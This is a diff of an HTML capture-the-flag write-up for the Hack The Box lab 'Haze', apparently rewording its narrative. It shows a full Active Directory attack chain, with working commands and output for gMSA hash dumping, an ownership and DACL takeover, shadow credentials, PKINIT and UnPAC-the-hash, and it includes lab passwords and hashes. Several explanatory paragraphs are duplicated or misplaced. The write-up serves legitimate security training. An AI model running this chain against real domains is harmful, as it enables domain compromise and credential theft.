+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\mark.adams\Documents&gt; dsacls &quot;CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB&quot;
  
 Owner: HAZE\Domain Admins
 Group: HAZE\Domain Admins
 
 Access list:
-Allow HAZE\gMSA_Managers SPECIAL ACCESS
- READ PERMISSONS
- LIST CONTENTS
- READ PROPERTY
-Allow HAZE\Domain Admins FULL CONTROL
-Allow BUILTIN\Account Operators FULL CONTROL
+Allow HAZE\gMSA_Managers              SPECIAL ACCESS
+                                      READ PERMISSONS
+                                      LIST CONTENTS
+                                      READ PROPERTY
+Allow HAZE\Domain Admins              FULL CONTROL
+Allow BUILTIN\Account Operators       FULL CONTROL
 Allow NT AUTHORITY\Authenticated Users
- SPECIAL ACCESS
- READ PERMISSONS
- LIST CONTENTS
- READ PROPERTY
- LIST OBJECT
-Allow NT AUTHORITY\SYSTEM FULL CONTROL
-Allow HAZE\Enterprise Admins FULL CONTROL &lt;Inherited from parent&gt;
+                                      SPECIAL ACCESS
+                                      READ PERMISSONS
+                                      LIST CONTENTS
+                                      READ PROPERTY
+                                      LIST OBJECT
+Allow NT AUTHORITY\SYSTEM             FULL CONTROL
+Allow HAZE\Enterprise Admins          FULL CONTROL   &lt;Inherited from parent&gt;
 Allow BUILTIN\Pre-Windows 2000 Compatible Access
- SPECIAL ACCESS &lt;Inherited from parent&gt;
- LIST CONTENTS
-Allow BUILTIN\Administrators SPECIAL ACCESS &lt;Inherited from parent&gt;
- DELETE
- READ PERMISSONS
- WRITE PERMISSIONS
- CHANGE OWNERSHIP
- CREATE CHILD
- LIST CONTENTS
- WRITE SELF
- WRITE PROPERTY
- READ PROPERTY
- LIST OBJECT
- CONTROL ACCESS
-Deny HAZE\paul.taylor SPECIAL ACCESS for msDS-ManagedPasswordPreviousId
- READ PROPERTY
-Deny HAZE\paul.taylor SPECIAL ACCESS for msDS-ManagedPasswordId
- READ PROPERTY
-Deny HAZE\paul.taylor SPECIAL ACCESS for msDS-ManagedPassword
- READ PROPERTY
-Deny HAZE\paul.taylor SPECIAL ACCESS for msDS-ManagedPasswordInterval
- READ PROPERTY
-Allow HAZE\gMSA_Managers SPECIAL ACCESS for msDS-GroupMSAMembership
- WRITE PROPERTY</code></pre></div>
-      <p>So now if I will run the gmsadumper command again you will see the hashes that is from the user Haze-IT-Backup$.</p>
+                                      SPECIAL ACCESS   &lt;Inherited from parent&gt;
+                                      LIST CONTENTS
+Allow BUILTIN\Administrators          SPECIAL ACCESS   &lt;Inherited from parent&gt;
+                                      DELETE
+                                      READ PERMISSONS
+                                      WRITE PERMISSIONS
+                                      CHANGE OWNERSHIP
+                                      CREATE CHILD
+                                      LIST CONTENTS
+                                      WRITE SELF
+                                      WRITE PROPERTY
+                                      READ PROPERTY
+                                      LIST OBJECT
+                                      CONTROL ACCESS
+Deny  HAZE\paul.taylor                SPECIAL ACCESS for msDS-ManagedPasswordPreviousId
+                                      READ PROPERTY
+Deny  HAZE\paul.taylor                SPECIAL ACCESS for msDS-ManagedPasswordId
+                                      READ PROPERTY
+Deny  HAZE\paul.taylor                SPECIAL ACCESS for msDS-ManagedPassword
+                                      READ PROPERTY
+Deny  HAZE\paul.taylor                SPECIAL ACCESS for msDS-ManagedPasswordInterval
+                                      READ PROPERTY
+Allow HAZE\gMSA_Managers              SPECIAL ACCESS for msDS-GroupMSAMembership
+                                      WRITE PROPERTY</code></pre></div>
+      <p>I use <code>gMSADumper.py</code> to extract the <strong>gMSA</strong> (Group Managed Service Account) password hash. gMSA accounts have their passwords automatically managed by Active Directory — the password is a 256-byte random value stored in the <code>msDS-ManagedPassword</code> attribute and rotated every 30 days (by default). Only principals listed in <code>PrincipalsAllowedToRetrieveManagedPassword</code> can read this value. Since we've added ourselves to the authorized group, we can dump the hash and use it for Pass-the-Hash authentication.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Haze/gMSADumper]
 └─$ python3 gMSADumper.py -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 -d haze.htb -l dc01.haze.htb
 Users or groups who can read password for Haze-IT-Backup$:
@@ -747,56 +451,54 @@ Users or groups who can read password for Haze-IT-Backup$:
 Haze-IT-Backup$:::a70df6599d5eab1502b38f9c1c3fd828
 Haze-IT-Backup$:aes256-cts-hmac-sha1-96:a455156dcce482f3ac359929b41d2f5ead1d72dd764b7f5d9f27a8c2a44a67a6
 Haze-IT-Backup$:aes128-cts-hmac-sha1-96:d99b9f57ffe1a4ab867a018a99a7edab</code></pre></div>
-      <p>I tried to crack from the hashes but unfortunately again no success. So now I will try to get all the data from the server by using the backup user and his hash. I wanted to see if this also works or not.</p>
+      <h3 class="writeup-sub-title">AD Group Ownership Chain</h3>
+      <p>I use <code>owneredit.py</code> to take ownership of the <code>Support_Services</code> group, then grant the gMSA account FullControl via <code>impacket-dacledit</code>. This enables adding the gMSA to the group, which provides Shadow Credential write access to user <code>edward.martin</code>.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Haze]
-└─$ nxc ldap 10.129.232.50 -u &#x27;Haze-IT-Backup$&#x27; --hash &#x27;a70df6599d5eab1502b38f9c1c3fd828&#x27; --bloodhound --collection All --dns-server 10.129.232.50 
-SMB 10.129.232.50 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
-LDAP 10.129.232.50 389 DC01 [+] haze.htb\Haze-IT-Backup$:a70df6599d5eab1502b38f9c1c3fd828 
-LDAP 10.129.232.50 389 DC01 Resolved collection methods: localadmin, trusts, container, group, objectprops, dcom, psremote, session, acl, rdp
-LDAP 10.129.232.50 389 DC01 Done in 00M 05S
-LDAP 10.129.232.50 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.129.232.50_2025-04-09_023349_bloodhound.zip</code></pre></div>
-      <p>By using the hash I was able to extract the data from the server. I will now unzip it and upload it in Bloodhound. After some searching on bloodhound I came to the conclusion that the user Haze-IT-Backup has writeOwner rights over the Support_Services group. This group can either change the password of the user edward.martin or can start adding keycredential links. In my case</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250408222454.png" alt="Pasted image 20250408222454.png" loading="lazy" /><span class="img-caption">Pasted image 20250408222454.png</span></div>
-      <p>First, I will start using the below command to change ownership of an Active Directory object. In this case, Haze-IT-Backup$ will become the owner of the Support_Services.</p>
-      <p>Doing so will give Haze-IT-Backup$ full control over this object and allow the access rights to be changed manually, which can eventually lead to privilege escalation within the Windows domain.</p>
+└─$ nxc ldap 10.129.232.50 -u &#x27;Haze-IT-Backup$&#x27; --hash &#x27;a70df6599d5eab1502b38f9c1c3fd828&#x27; --bloodhound --collection All --dns-server 10.129.232.50       
+SMB         10.129.232.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.232.50   389    DC01             [+] haze.htb\Haze-IT-Backup$:a70df6599d5eab1502b38f9c1c3fd828 
+LDAP        10.129.232.50   389    DC01             Resolved collection methods: localadmin, trusts, container, group, objectprops, dcom, psremote, session, acl, rdp
+LDAP        10.129.232.50   389    DC01             Done in 00M 05S
+LDAP        10.129.232.50   389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.232.50_2025-04-09_023349_bloodhound.zip</code></pre></div>
+      <p>I use <code>owneredit.py</code> to take ownership of the target AD object, which is the first step in gaining full control over it.</p>
       <div class="code-block"><pre><code>owneredit.py -action write -new-owner &#x27;Haze-IT-Backup$&#x27; -target &#x27;Support_Services&#x27; -target-dn &#x27;CN=Support_Services,CN=Users,DC=haze,DC=htb&#x27; -hashes :a70df6599d5eab1502b38f9c1c3fd828 -dc-ip 10.129.232.50 &#x27;haze.htb/Haze-IT-Backup$&#x27;
 
 /home/kali/.local/bin/owneredit.py:87: SyntaxWarning: invalid escape sequence &#x27;\V&#x27;
- &#x27;S-1-5-83-0&#x27;: &#x27;NT VIRTUAL MACHINE\Virtual Machines&#x27;,
+  &#x27;S-1-5-83-0&#x27;: &#x27;NT VIRTUAL MACHINE\Virtual Machines&#x27;,
 /home/kali/.local/bin/owneredit.py:96: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;
- &#x27;S-1-5-32-554&#x27;: &#x27;BUILTIN\Pre-Windows 2000 Compatible Access&#x27;,
+  &#x27;S-1-5-32-554&#x27;: &#x27;BUILTIN\Pre-Windows 2000 Compatible Access&#x27;,
 /home/kali/.local/bin/owneredit.py:97: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-555&#x27;: &#x27;BUILTIN\Remote Desktop Users&#x27;,
+  &#x27;S-1-5-32-555&#x27;: &#x27;BUILTIN\Remote Desktop Users&#x27;,
 /home/kali/.local/bin/owneredit.py:98: SyntaxWarning: invalid escape sequence &#x27;\I&#x27;
- &#x27;S-1-5-32-557&#x27;: &#x27;BUILTIN\Incoming Forest Trust Builders&#x27;,
+  &#x27;S-1-5-32-557&#x27;: &#x27;BUILTIN\Incoming Forest Trust Builders&#x27;,
 /home/kali/.local/bin/owneredit.py:100: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;
- &#x27;S-1-5-32-558&#x27;: &#x27;BUILTIN\Performance Monitor Users&#x27;,
+  &#x27;S-1-5-32-558&#x27;: &#x27;BUILTIN\Performance Monitor Users&#x27;,
 /home/kali/.local/bin/owneredit.py:101: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;
- &#x27;S-1-5-32-559&#x27;: &#x27;BUILTIN\Performance Log Users&#x27;,
+  &#x27;S-1-5-32-559&#x27;: &#x27;BUILTIN\Performance Log Users&#x27;,
 /home/kali/.local/bin/owneredit.py:102: SyntaxWarning: invalid escape sequence &#x27;\W&#x27;
- &#x27;S-1-5-32-560&#x27;: &#x27;BUILTIN\Windows Authorization Access Group&#x27;,
+  &#x27;S-1-5-32-560&#x27;: &#x27;BUILTIN\Windows Authorization Access Group&#x27;,
 /home/kali/.local/bin/owneredit.py:103: SyntaxWarning: invalid escape sequence &#x27;\T&#x27;
- &#x27;S-1-5-32-561&#x27;: &#x27;BUILTIN\Terminal Server License Servers&#x27;,
+  &#x27;S-1-5-32-561&#x27;: &#x27;BUILTIN\Terminal Server License Servers&#x27;,
 /home/kali/.local/bin/owneredit.py:104: SyntaxWarning: invalid escape sequence &#x27;\D&#x27;
- &#x27;S-1-5-32-562&#x27;: &#x27;BUILTIN\Distributed COM Users&#x27;,
+  &#x27;S-1-5-32-562&#x27;: &#x27;BUILTIN\Distributed COM Users&#x27;,
 /home/kali/.local/bin/owneredit.py:105: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;
- &#x27;S-1-5-32-569&#x27;: &#x27;BUILTIN\Cryptographic Operators&#x27;,
+  &#x27;S-1-5-32-569&#x27;: &#x27;BUILTIN\Cryptographic Operators&#x27;,
 /home/kali/.local/bin/owneredit.py:106: SyntaxWarning: invalid escape sequence &#x27;\E&#x27;
- &#x27;S-1-5-32-573&#x27;: &#x27;BUILTIN\Event Log Readers&#x27;,
+  &#x27;S-1-5-32-573&#x27;: &#x27;BUILTIN\Event Log Readers&#x27;,
 /home/kali/.local/bin/owneredit.py:107: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;
- &#x27;S-1-5-32-574&#x27;: &#x27;BUILTIN\Certificate Service DCOM Access&#x27;,
+  &#x27;S-1-5-32-574&#x27;: &#x27;BUILTIN\Certificate Service DCOM Access&#x27;,
 /home/kali/.local/bin/owneredit.py:108: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-575&#x27;: &#x27;BUILTIN\RDS Remote Access Servers&#x27;,
+  &#x27;S-1-5-32-575&#x27;: &#x27;BUILTIN\RDS Remote Access Servers&#x27;,
 /home/kali/.local/bin/owneredit.py:109: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-576&#x27;: &#x27;BUILTIN\RDS Endpoint Servers&#x27;,
+  &#x27;S-1-5-32-576&#x27;: &#x27;BUILTIN\RDS Endpoint Servers&#x27;,
 /home/kali/.local/bin/owneredit.py:110: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-577&#x27;: &#x27;BUILTIN\RDS Management Servers&#x27;,
+  &#x27;S-1-5-32-577&#x27;: &#x27;BUILTIN\RDS Management Servers&#x27;,
 /home/kali/.local/bin/owneredit.py:111: SyntaxWarning: invalid escape sequence &#x27;\H&#x27;
- &#x27;S-1-5-32-578&#x27;: &#x27;BUILTIN\Hyper-V Administrators&#x27;,
+  &#x27;S-1-5-32-578&#x27;: &#x27;BUILTIN\Hyper-V Administrators&#x27;,
 /home/kali/.local/bin/owneredit.py:112: SyntaxWarning: invalid escape sequence &#x27;\A&#x27;
- &#x27;S-1-5-32-579&#x27;: &#x27;BUILTIN\Access Control Assistance Operators&#x27;,
+  &#x27;S-1-5-32-579&#x27;: &#x27;BUILTIN\Access Control Assistance Operators&#x27;,
 /home/kali/.local/bin/owneredit.py:113: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-580&#x27;: &#x27;BUILTIN\Remote Management Users&#x27;,
+  &#x27;S-1-5-32-580&#x27;: &#x27;BUILTIN\Remote Management Users&#x27;,
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Current owner information below
@@ -804,54 +506,54 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] - sAMAccountName: Haze-IT-Backup$
 [*] - distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
 [*] OwnerSid modified successfully!</code></pre></div>
-      <p>Next, I will use the command below which uses the impacket-dacledit command to modify the access list (DACL) of the Active Directory object SUPPORT_SERVICES.</p>
-      <p>This will give the service account Haze-IT-Backup$ FullControl over the object, allowing it to modify permissions itself, reset passwords and gain full control over the object.</p>
+      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <strong>FullControl</strong> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
       <div class="code-block"><pre><code>impacket-dacledit -action write -rights FullControl -principal &#x27;Haze-IT-Backup$&#x27; -target-dn &#x27;CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB&#x27; -dc-ip 10.129.232.50 &quot;haze.htb/Haze-IT-Backup$&quot; -hashes &#x27;:a70df6599d5eab1502b38f9c1c3fd828&#x27;
 /usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence &#x27;\V&#x27;
- &#x27;S-1-5-83-0&#x27;: &#x27;NT VIRTUAL MACHINE\Virtual Machines&#x27;,
+  &#x27;S-1-5-83-0&#x27;: &#x27;NT VIRTUAL MACHINE\Virtual Machines&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;
- &#x27;S-1-5-32-554&#x27;: &#x27;BUILTIN\Pre-Windows 2000 Compatible Access&#x27;,
+  &#x27;S-1-5-32-554&#x27;: &#x27;BUILTIN\Pre-Windows 2000 Compatible Access&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:111: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-555&#x27;: &#x27;BUILTIN\Remote Desktop Users&#x27;,
+  &#x27;S-1-5-32-555&#x27;: &#x27;BUILTIN\Remote Desktop Users&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:112: SyntaxWarning: invalid escape sequence &#x27;\I&#x27;
- &#x27;S-1-5-32-557&#x27;: &#x27;BUILTIN\Incoming Forest Trust Builders&#x27;,
+  &#x27;S-1-5-32-557&#x27;: &#x27;BUILTIN\Incoming Forest Trust Builders&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:114: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;
- &#x27;S-1-5-32-558&#x27;: &#x27;BUILTIN\Performance Monitor Users&#x27;,
+  &#x27;S-1-5-32-558&#x27;: &#x27;BUILTIN\Performance Monitor Users&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:115: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;
- &#x27;S-1-5-32-559&#x27;: &#x27;BUILTIN\Performance Log Users&#x27;,
+  &#x27;S-1-5-32-559&#x27;: &#x27;BUILTIN\Performance Log Users&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:116: SyntaxWarning: invalid escape sequence &#x27;\W&#x27;
- &#x27;S-1-5-32-560&#x27;: &#x27;BUILTIN\Windows Authorization Access Group&#x27;,
+  &#x27;S-1-5-32-560&#x27;: &#x27;BUILTIN\Windows Authorization Access Group&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:117: SyntaxWarning: invalid escape sequence &#x27;\T&#x27;
- &#x27;S-1-5-32-561&#x27;: &#x27;BUILTIN\Terminal Server License Servers&#x27;,
+  &#x27;S-1-5-32-561&#x27;: &#x27;BUILTIN\Terminal Server License Servers&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:118: SyntaxWarning: invalid escape sequence &#x27;\D&#x27;
- &#x27;S-1-5-32-562&#x27;: &#x27;BUILTIN\Distributed COM Users&#x27;,
+  &#x27;S-1-5-32-562&#x27;: &#x27;BUILTIN\Distributed COM Users&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:119: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;
- &#x27;S-1-5-32-569&#x27;: &#x27;BUILTIN\Cryptographic Operators&#x27;,
+  &#x27;S-1-5-32-569&#x27;: &#x27;BUILTIN\Cryptographic Operators&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:120: SyntaxWarning: invalid escape sequence &#x27;\E&#x27;
- &#x27;S-1-5-32-573&#x27;: &#x27;BUILTIN\Event Log Readers&#x27;,
+  &#x27;S-1-5-32-573&#x27;: &#x27;BUILTIN\Event Log Readers&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:121: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;
- &#x27;S-1-5-32-574&#x27;: &#x27;BUILTIN\Certificate Service DCOM Access&#x27;,
+  &#x27;S-1-5-32-574&#x27;: &#x27;BUILTIN\Certificate Service DCOM Access&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:122: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-575&#x27;: &#x27;BUILTIN\RDS Remote Access Servers&#x27;,
+  &#x27;S-1-5-32-575&#x27;: &#x27;BUILTIN\RDS Remote Access Servers&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:123: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-576&#x27;: &#x27;BUILTIN\RDS Endpoint Servers&#x27;,
+  &#x27;S-1-5-32-576&#x27;: &#x27;BUILTIN\RDS Endpoint Servers&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:124: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-577&#x27;: &#x27;BUILTIN\RDS Management Servers&#x27;,
+  &#x27;S-1-5-32-577&#x27;: &#x27;BUILTIN\RDS Management Servers&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:125: SyntaxWarning: invalid escape sequence &#x27;\H&#x27;
- &#x27;S-1-5-32-578&#x27;: &#x27;BUILTIN\Hyper-V Administrators&#x27;,
+  &#x27;S-1-5-32-578&#x27;: &#x27;BUILTIN\Hyper-V Administrators&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:126: SyntaxWarning: invalid escape sequence &#x27;\A&#x27;
- &#x27;S-1-5-32-579&#x27;: &#x27;BUILTIN\Access Control Assistance Operators&#x27;,
+  &#x27;S-1-5-32-579&#x27;: &#x27;BUILTIN\Access Control Assistance Operators&#x27;,
 /usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;
- &#x27;S-1-5-32-580&#x27;: &#x27;BUILTIN\Remote Management Users&#x27;,
+  &#x27;S-1-5-32-580&#x27;: &#x27;BUILTIN\Remote Management Users&#x27;,
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] DACL backed up to dacledit-20250415-003552.bak
 [*] DACL modified successfully!</code></pre></div>
-      <p>The following command adds the machine account Haze-IT-Backup$ to the Active Directory group SUPPORT_SERVICES via bloodyAD. This causes the account to inherit the privileges of this group, which can lead to increased privileges within the domain.</p>
+      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>bloodyAD --host &quot;10.129.232.50&quot; -d &quot;haze.htb&quot; -u &quot;Haze-IT-Backup$&quot; -p &quot;:a70df6599d5eab1502b38f9c1c3fd828&quot; add groupMember SUPPORT_SERVICES Haze-IT-Backup$
 [+] Haze-IT-Backup$ added to SUPPORT_SERVICES</code></pre></div>
-      <p>I used pyWhisker to add a new KeyCredential to the account edward.martin within Active Directory. This associates a self-generated certificate with the user, making it possible to obtain a Ticket Granting Ticket (TGT) via PKINIT, without knowing the user&#x27;s password. This allows an attacker to authenticate as edward.martin and obtain elevated privileges within the domain.</p>
-      <div class="code-block"><pre><code>pywhisker -d &quot;haze.htb&quot; -u &quot;Haze-IT-Backup$&quot; -H &#x27;:a70df6599d5eab1502b38f9c1c3fd828&#x27; --target edward.martin --action add 
+      <h3 class="writeup-sub-title">Shadow Credentials & PKINIT</h3>
+      <p>I use <strong>pyWhisker</strong> to add a shadow credential to <code>edward.martin</code>, then <code>gettgtpkinit.py</code> to request a TGT, and finally <code>getnthash.py</code> to extract the NTLM hash. Time synchronization with <code>faketime</code> is critical for Kerberos to work.</p>
+      <div class="code-block"><pre><code>pywhisker -d &quot;haze.htb&quot; -u &quot;Haze-IT-Backup$&quot; -H &#x27;:a70df6599d5eab1502b38f9c1c3fd828&#x27; --target edward.martin --action add                                                                                                              
 [*] Searching for the target account
 [*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
 [*] Generating certificate
@@ -863,49 +565,49 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [+] Saved PFX (#PKCS12) certificate &amp; key at path: AOQ3Dter.pfx
 [*] Must be used with password: UZGyz7RPTOKHY43G7F8e
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</code></pre></div>
-      <p>This command uses gettgtpkinit.py to obtain a Kerberos Ticket Granting Ticket (TGT) for the account edward.martin. This is done via PKINIT authentication using a previously generated PFX certificate instead of a password. The TGT is stored in a .ccache file (edward.ccache), which allows further Kerberos authentication and access to domain resources without the user&#x27;s actual login credentials.</p>
+      <p>I use <code>gettgtpkinit.py</code> to request a Kerberos TGT using the certificate-based PKINIT authentication method.</p>
       <div class="code-block"><pre><code>python3 gettgtpkinit.py haze.htb/edward.martin -cert-pfx ~/HTB/Haze/PKINITtools/AWyxaEdb.pfx -pfx-pass rhWUv5CjBaOFQoM610sp edward.ccache 
-2025-04-15 01:56:14,002 minikerberos INFO Loading certificate and key from file
+2025-04-15 01:56:14,002 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
-2025-04-15 01:56:14,014 minikerberos INFO Requesting TGT
+2025-04-15 01:56:14,014 minikerberos INFO     Requesting TGT
 INFO:minikerberos:Requesting TGT
 Traceback (most recent call last):
- File &quot;/home/kali/HTB/Haze/PKINITtools/gettgtpkinit.py&quot;, line 349, in &lt;module&gt;
- main()
- ~~~~^^
- File &quot;/home/kali/HTB/Haze/PKINITtools/gettgtpkinit.py&quot;, line 345, in main
- amain(args)
- ~~~~~^^^^^^
- File &quot;/home/kali/HTB/Haze/PKINITtools/gettgtpkinit.py&quot;, line 315, in amain
- res = sock.sendrecv(req)
- File &quot;/usr/lib/python3/dist-packages/minikerberos/network/clientsocket.py&quot;, line 85, in sendrecv
- raise KerberosError(krb_message)
-minikerberos.protocol.errors.KerberosError: Error Name: KRB_AP_ERR_SKEW Detail: &quot;The clock skew is too great&quot;</code></pre></div>
-      <p>We will have to fake the time so that it can no longer give problems about that. I will start doing this by using the following command.</p>
+  File &quot;/home/kali/HTB/Haze/PKINITtools/gettgtpkinit.py&quot;, line 349, in &lt;module&gt;
+    main()
+    ~~~~^^
+  File &quot;/home/kali/HTB/Haze/PKINITtools/gettgtpkinit.py&quot;, line 345, in main
+    amain(args)
+    ~~~~~^^^^^^
+  File &quot;/home/kali/HTB/Haze/PKINITtools/gettgtpkinit.py&quot;, line 315, in amain
+    res = sock.sendrecv(req)
+  File &quot;/usr/lib/python3/dist-packages/minikerberos/network/clientsocket.py&quot;, line 85, in sendrecv
+    raise KerberosError(krb_message)
+minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: &quot;The clock skew is too great&quot;</code></pre></div>
+      <p>I use <code>gettgtpkinit.py</code> to request a Kerberos TGT using the certificate-based PKINIT authentication method.</p>
       <div class="code-block"><pre><code>faketime &quot;$(ntpdate -q 10.129.232.50 | cut -d &#x27; &#x27; -f 1,2)&quot; \
 &gt; python3 gettgtpkinit.py haze.htb/edward.martin -cert-pfx ~/HTB/Haze/PKINITtools/AWyxaEdb.pfx -pfx-pass rhWUv5CjBaOFQoM610sp edward.ccache
-2025-04-15 06:19:05,528 minikerberos INFO Loading certificate and key from file
+2025-04-15 06:19:05,528 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
-2025-04-15 06:19:05,537 minikerberos INFO Requesting TGT
+2025-04-15 06:19:05,537 minikerberos INFO     Requesting TGT
 INFO:minikerberos:Requesting TGT
-2025-04-15 06:19:12,642 minikerberos INFO AS-REP encryption key (you might need this later):
+2025-04-15 06:19:12,642 minikerberos INFO     AS-REP encryption key (you might need this later):
 INFO:minikerberos:AS-REP encryption key (you might need this later):
-2025-04-15 06:19:12,642 minikerberos INFO bab15cca2e09ca8b086c9f6cc400022761f60e26c16a7b471ae8ba1c9fa6000e
+2025-04-15 06:19:12,642 minikerberos INFO     bab15cca2e09ca8b086c9f6cc400022761f60e26c16a7b471ae8ba1c9fa6000e
 INFO:minikerberos:bab15cca2e09ca8b086c9f6cc400022761f60e26c16a7b471ae8ba1c9fa6000e
-2025-04-15 06:19:12,644 minikerberos INFO Saved TGT to file
+2025-04-15 06:19:12,644 minikerberos INFO     Saved TGT to file
 INFO:minikerberos:Saved TGT to file</code></pre></div>
-      <p>This command sets the KRB5CCNAME variable so that the system knows which Kerberos ticket to use. In this case, the variable points to the edward.ccache file, allowing future Kerberos requests to automatically use the obtained TGT for the edward.martin account.</p>
+      <p>I set the <code>KRB5CCNAME</code> environment variable to specify which Kerberos credential cache file to use for authentication in subsequent commands.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Haze/PKINITtools]
 └─$ export KRB5CCNAME=/home/kali/Haze/PKINITtools/edward.ccache</code></pre></div>
-      <p>This command uses getnthash.py to extract the NTLM hash of the account edward.martin. This is done using the Kerberos session key obtained earlier. The NTLM hash can then be used for pass-the-hash attacks or further authentication within the domain, without knowing the user&#x27;s password.</p>
+      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <strong>U2U</strong> (User-to-User) mechanism. This technique, known as <strong>UnPAC-the-Hash</strong>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
       <div class="code-block"><pre><code>python getnthash.py -key d73a3f966d30198731b2a6dac970a3b80ae06128d08edda347126945db085450 haze.htb/edward.martin
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Using TGT from cache
 [*] Requesting ticket to self with PAC
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></pre></div>
-      <p>But as before, time was acting difficult, so I had to fake this one for this command as well.</p>
-      <div class="code-block"><pre><code>faketime &quot;$(ntpdate -q 10.129.232.50 | cut -d &#x27; &#x27; -f 1,2)&quot; \ 
+      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <strong>U2U</strong> (User-to-User) mechanism. This technique, known as <strong>UnPAC-the-Hash</strong>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
+      <div class="code-block"><pre><code>faketime &quot;$(ntpdate -q 10.129.232.50 | cut -d &#x27; &#x27; -f 1,2)&quot; \                                                    
 &gt; python getnthash.py -key d73a3f966d30198731b2a6dac970a3b80ae06128d08edda347126945db085450 haze.htb/edward.martin
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -913,61 +615,58 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting ticket to self with PAC
 Recovered NT Hash
